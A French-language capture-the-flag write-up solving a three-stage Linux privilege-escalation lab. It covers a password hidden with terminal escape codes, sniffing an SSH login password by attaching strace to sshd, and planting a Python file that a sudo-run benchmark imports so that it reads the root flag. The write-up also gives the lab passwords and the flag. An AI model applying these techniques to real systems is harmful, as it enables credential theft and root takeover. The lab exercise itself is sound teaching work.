#### *créateur:* `Lamarr`
#### *catégorie:* `App-Script`

#### *Difficulté:* `Medium / Easy`

### *Description:*

```
Chaque étape est une marche de plus vers le succés ! Et une annonce importante vous attendras au bout du chemin ! 
```

##### *Accés:* 

`password :: hyjfsbuoiqsbhisqnhuio`
`ssh -p 23 tok@localhost`

## 1 - Connexion au challenge

```bash
ssh -p 23 tok@localhost
```

Nous sommes l'utilisateur `tok`

On peut voire tout d'abord un script nommé `cat_is_bad.sh` il semble qu'on essayent de nous faire passer un message ;P

```bash
tok@21d5ef4e5b54:~$ ls
cat_is_bad.sh
tok@21d5ef4e5b54:~$ ls -la
total 28
drwx------ 1 tok  tok  4096 Apr 23 17:03 .
drwxr-xr-x 1 root root 4096 Apr 22 20:04 ..
-rw-r--r-- 1 tok  tok   220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 tok  tok  3526 Apr 18  2019 .bashrc
-rw-r--r-- 1 tok  tok   807 Apr 18  2019 .profile
-rwxr-xr-x 1 root root   90 Apr 23 17:03 cat_is_bad.sh
```

Voyons ce qu'il contient...

```bash
tok@21d5ef4e5b54:~$ cat cat_is_bad.sh 
#!/bin/sh
echo "Things are not always what they seem!"
tok@21d5ef4e5b54:~$ 
```

Rien de bien intéréssant à première vue dans ce script éxecutons le quand même pour voir:

```bash
tok@21d5ef4e5b54:~$ ./cat_is_bad.sh 
tok@21d5ef4e5b54:~$ 
```

C'est bizarre... Rien ne se passe

Nous pouvons essayer d'autres techniques pour voir si rien n'est caché dans le script

```bash
tok@21d5ef4e5b54:~$ strings cat_is_bad.sh 
-bash: /usr/bin/strings: Permission denied

tok@21d5ef4e5b54:~$ tac cat_is_bad.sh 
-bash: /usr/bin/tac: Permission denied

tok@21d5ef4e5b54:~$ less cat_is_bad.sh 
-bash: /usr/bin/less: Permission denied
```

Nous n'avons pas les permissions pour utiliser ces binaires c'est plutôt louche...
Après quelques test il semble que nous pouvons utiliser `xxd`

Et là... nous avons quelque chose d'intéressant

```bash
tok@21d5ef4e5b54:~$ xxd cat_is_bad.sh 
00000000: 2321 2f62 696e 2f73 680a 7061 7373 3d61  #!/bin/sh.pass=a
00000010: 7465 7267 6473 6771 6c75 6936 3838 3137  tergdsgqlui68817
00000020: 360a 6578 6974 0a1b 5b41 1b5b 4165 6368  6.exit..[A.[Aech
00000030: 6f20 2254 6869 6e67 7320 6172 6520 6e6f  o "Things are no
00000040: 7420 616c 7761 7973 2077 6861 7420 7468  t always what th
00000050: 6579 2073 6565 6d21 220a                 ey seem!".
```

Nous pouvons obtenir le même résultat avec le paramètre `cat -A`

```bash
tok@21d5ef4e5b54:~$ cat -A cat_is_bad.sh 
#!/bin/sh$
pass=atergdsgqlui688176$
exit$
^[[A^[[Aecho "Things are not always what they seem!"$]]
```

Du contenue a était caché à l'aide de charactères d'échappements, il faut toujours faire attention car cat sans argument n'affiche pas tout le contenue

En bref, quand vous exécutez `cat` sur ce fichier, les séquences de contrôle intégrées dans le script peuvent altérer l'affichage attendu dans le terminal, en masquant ou en modifiant visuellement une partie du contenu du script.

Passons à la suite nous avons un mot de passe, essayons de nous connecter avec sur l'utilisateur `gwen`

```bash
su gwen
gwen@21d5ef4e5b54:/home/tok$
```

Voyons dans le home de l'utilisateur, il y a un fichier `bravo.txt`

```
Congratulations, you've passed the first stage! For what comes next, be careful—SSH always leaves traces ;)
```

Pour cette deuxième étape nous avons un indice... apparament ssh laisse toujours des traces...

On pourrait penser à des fichiers de connexion comme une clé privé qu'il pourrait falloir trouver, mais en éxécutant `sudo -l` on s'aperçoit que nous avons le droit d'éxecuter ça:

```bash
gwen@21d5ef4e5b54:~$ sudo -l
Matching Defaults entries for gwen on 21d5ef4e5b54:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwen may run the following commands on 21d5ef4e5b54:
    (ALL) NOPASSWD: /usr/bin/strace -p 0
    (ALL) NOPASSWD: /usr/bin/strace -p [1-9]
    (ALL) NOPASSWD: /usr/bin/strace -p [1-9][0-9]
    (ALL) NOPASSWD: /usr/bin/strace -p [1-9][0-9][0-9]
    (ALL) NOPASSWD: /usr/bin/strace -p [1-9][0-9][0-9][0-9]
    (ALL) NOPASSWD: /usr/bin/strace -p [1-9][0-9][0-9][0-9][0-9]
```

Ceci concorde avec notre indice qui nous dit de faire attention aux traces ssh

en éxecutant `ps aux` pour afficher les processus (car l'option `-p` de`strace` nous oblige à l'utiliser sur un pid), GTFO bins ne nous servira pas cette fois ;)

```bash
gwen@21d5ef4e5b54:~$ ps aux

USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...SNIP...
gwen         563  0.0  0.0   4000  2880 pts/0    S    17:31   0:00 bash
root         665  0.0  0.0  14468  6624 ?        Ss   17:37   0:00 sshd: du [priv]
sshd         666  0.0  0.0  13820  4484 ?        S    17:37   0:00 sshd: du [net]
gwen         667  0.0  0.0   7640  2592 pts/0    R+   17:37   0:00 ps aux
```

L'un d'entre eux nous intéressent tout particulièrement: le 665

Mais si on réexecute `ps aux` un peut après, il n'a plus le même numéro... bizarre, bizarre...

```bash
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...SNIP...
root         732  0.0  0.0  14468  6912 ?        Ss   17:40   0:00 sshd: du [priv]
...SNIP...
```

Il éxiste une technique qui permet à un attaquant de sniffer les mots de passes (en clair) des gens qui se connectent en ssh et en utilisant `strace` en plus ! Voyons ce que celà donne...

Nous allons attendre la nouvelle aparition de ce processus récupérer le PID et éxecuter strace.

```bash
gwen@21d5ef4e5b54:~$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...SNIP...
root         833  0.0  0.0  14468  6912 ?        Ss   17:45   0:00 sshd: du [priv]
sshd         834  0.0  0.0  13820  4484 ?        S    17:45   0:00 sshd: du [net]
gwen         835  0.0  0.0   7640  2016 pts/0    R+   17:46   0:00 ps aux
```

```bash
gwen@21d5ef4e5b54:~$ sudo /usr/bin/strace -p 833
/usr/bin/strace: Process 833 attached
restart_syscall(<... resuming interrupted read ...>) = 1
```

La réponse ne se fait pas attendre, nous interceptons une longue trace et si nous remontons tout en haut de celle ci...

```bash
gwen@21d5ef4e5b54:~$ sudo /usr/bin/strace -p 833
/usr/bin/strace: Process 833 attached
restart_syscall(<... resuming interrupted read ...>) = 1
read(6, "\0\0\0\23", 4)                 = 4
read(6, "\f\0\0\0\16Super3cr3tP455", 19) = 19
getuid()                                = 0
openat(AT_FDCWD, "/etc/login.defs", O_RDONLY) = 4
fstat(4, {st_mode=S_IFREG|0644, st_size=10477, ...}) = 0
read(4, "#\n# /etc/login.defs - Configurat"..., 4096) = 4096
read(4, " issuing \n# the \"mesg y\" command"..., 4096) = 4096
read(4, "t supports passwords of unlimite"..., 4096) = 2285
```

Ca sent bon ! ça ressemble beaucoup à un mot de passe !
```
read(6, "\f\0\0\0\16Super3cr3tP455", 19) = 19
Super3cr3tP455
```

Nous allons nous connecter à l'utilisateur `du` avec ce mot de passe

```bash
su du
```

```bash
gwen@21d5ef4e5b54:~$ su du
Password: 
du@21d5ef4e5b54:/home/gwen$ cd ~
du@21d5ef4e5b54:~$ 
```

Nous voilà maintennant à la dernière étape

Dans le répertoir home de l'utilisateur il y a un dossier d'une très légère x) app python et un dossier de benchmarkcontennat lui aussi un script:

```bash
du@21d5ef4e5b54:~$ ls app/*
app/app.py

app/bench:
runbench.py
```

Nous allons exécuter app.py pour voir !

```bash
du@64ba5b5db76f:~$ python3 app/app.py 
 _____     _         ____          ____   ___ ____  ____  
|_   _|__ | | __    |  _ \ _   _  |___ \ / _ \___ \| ___| 
  | |/ _ \| |/ /____| | | | | | |   __) | | | |__) |___ \ 
  | | (_) |   <_____| |_| | |_| |  / __/| |_| / __/ ___) |
  |_|\___/|_|\_\    |____/ \__,_| |_____|\___/_____|____/                        
```

Oh ! Le créateur du challenge tient vraiment à nous faire passer un message semblerait il :D

En éxecutant `sudo -l`

```bash
du@21d5ef4e5b54:~$ sudo -l
Matching Defaults entries for du on 21d5ef4e5b54:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User du may run the following commands on 21d5ef4e5b54:
    (ALL) NOPASSWD: /home/du/app/bench/runbench.py
```

On peut voir que nous pouvons utiliser sudo sur le fichier `runbench.py`

```python
#!/usr/bin/env python3

import os
import re
import sys
from subprocess import call

_filename_re = re.compile(r"^bench_(.*?)\.py$")
new_bench_directory = "/home/du/app/script/"

def list_benchmarks():
    result = []
    for name in os.listdir(new_bench_directory):
        match = _filename_re.match(name)
        if match is not None:
            result.append(match.group(1))
    result.sort(key=lambda x: (x.startswith("logging_"), x.lower()))
    return result

def run_bench(name):
    print(name)
    call([sys.executable, "-m", "timeit", "-s", f"from bench_{name} import run", "run()"])

def main():
    print("=" * 80)
    print("Running benchmark for the Big Event Tok Duuuuuu !!!!")
    print("-" * 80)
    os.chdir(new_bench_directory)
    for bench in list_benchmarks():
        run_bench(bench)
    print("-" * 80)

if __name__ == "__main__":
    main()
```

Essayons de le modifier:

```bash
du@64ba5b5db76f:~$ vi /home/du/app/bench/runbench.py
bash: vi: command not found
du@64ba5b5db76f:~$ echo "test" >> /home/du/app/bench/runbench.py
bash: /home/du/app/bench/runbench.py: Permission denied
```

Mince :/

Mais en le lisant de plus prêt on voit que ce script de benchmark éxecute les script dans le répertoir script en suivant ce regex:

```python
_filename_re = re.compile(r"^bench_(.*?)\.py$")
new_bench_directory = "/home/du/app/script/"
```

Et sachant que nous avons les droits en écriture dans le dossier nous pouvons tout simplement faire:

```bash
echo '__import__("os").system("cat /root/flag.txt")' > /home/du/app/script/bench_abc.py
```

Puis ...

```bash
du@5f8d37767546:~$ sudo /home/du/app/bench/runbench.py
================================================================================
Running benchmark for the Big Event Tok Duuuuuu !!!!
--------------------------------------------------------------------------------
abc
MCTF{t0k_Gw3n_Du_2025!!!}
Traceback (most recent call last):
  File "/usr/lib/python3.11/timeit.py", line 326, in main
    number, _ = t.autorange(callback)
                ^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/timeit.py", line 224, in autorange
    time_taken = self.timeit(number)
                 ^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.11/timeit.py", line 178, in timeit
    timing = self.inner(it, self.timer)
             ^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<timeit-src>", line 3, in inner
    from bench_abc import run
ImportError: cannot import name 'run' from 'bench_abc' (/home/du/app/script/bench_abc.py)
--------------------------------------------------------------------------------
```

Voilà le flag !!!!

```
MCTF{t0k_Gw3n_Du_2025!!!}
```
